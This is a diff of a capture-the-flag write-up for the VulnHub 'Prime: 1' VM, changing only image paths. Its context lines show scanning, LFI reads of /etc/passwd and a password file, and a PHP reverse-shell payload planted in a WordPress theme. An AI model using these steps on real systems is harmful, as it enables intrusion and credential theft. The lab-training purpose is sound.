@@ -3,7 +3,7 @@
 - **Machine:** Prime: 1
 - **Download:** https://www.vulnhub.com/entry/prime-1,358/
 
-![](853-1.png)
+![](images/853-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](853-2.png)
+![](images/853-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Perform a complete scan to enumerate ports, services, operating system, and defa
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
 ```
 
-![](853-3.png)
+![](images/853-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
 ```
 
-![](853-4.png)
+![](images/853-4.png)
 
 ---
 
@@ -82,7 +82,7 @@ Brute-force directories.
 gobuster dir -u http://192.168.2.182/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
-![](853-5.png)
+![](images/853-5.png)
 
 Discovered endpoints:
 
@@ -91,7 +91,7 @@ http://192.168.2.182/secret.txt
 http://192.168.2.182/dev
 ```
 
-![](853-6.png)
+![](images/853-6.png)
 
 The page suggests fuzzing for hidden parameters.
 
@@ -105,7 +105,7 @@ Enumerate hidden GET parameters.
 wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://192.168.2.182/index.php?FUZZ=location.txt" --hh 136
 ```
 
-![](853-7.png)
+![](images/853-7.png)
 
 ### Command Breakdown
 
@@ -127,7 +127,7 @@ Visit:
 http://192.168.2.182/index.php?file=location.txt
 ```
 
-![](853-8.png)
+![](images/853-8.png)
 
 A new parameter name is revealed.
 
@@ -151,7 +151,7 @@ Use the newly discovered parameter.
 http://192.168.2.182/image.php?secrettier360
 ```
 
-![](853-9.png)
+![](images/853-9.png)
 
 The parameter is vulnerable to Local File Inclusion.
 
@@ -161,7 +161,7 @@ Read the passwd file.
 http://192.168.2.182/image.php?secrettier360=/etc/passwd
 ```
 
-![](853-10.png)
+![](images/853-10.png)
 
 A normal user is identified.
 
@@ -175,7 +175,7 @@ Read the password file.
 http://192.168.2.182/image.php?secrettier360=/home/saket/password.txt
 ```
 
-![](853-11.png)
+![](images/853-11.png)
 
 Recovered password:
 
@@ -193,7 +193,7 @@ Login to the WordPress administration panel.
 http://192.168.2.182/wordpress/wp-login.php
 ```
 
-![](853-13.png)
+![](images/853-13.png)
 
 Navigate to:
 
@@ -214,7 +214,7 @@ $proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
 ?>
 ```
 
-![](853-14.png)
+![](images/853-14.png)
 
 Start a Netcat listener.
 
@@ -230,7 +230,7 @@ http://192.168.2.182/wordpress/wp-content/themes/twentynineteen/secret.php
 
 A reverse shell is received.
 
-![](853-15.png)
+![](images/853-15.png)
 
 ---
 
@@ -266,7 +266,7 @@ Read the user flag.
 cat user.txt
 ```
 
-![](853-16.png)
+![](images/853-16.png)
 
 User flag:
 
@@ -284,7 +284,7 @@ Enumerate the user's sudo permissions.
 sudo -l
 ```
 
-![](853-17.png)
+![](images/853-17.png)
 
 Further privilege escalation can be performed based on the allowed sudo entries.
 
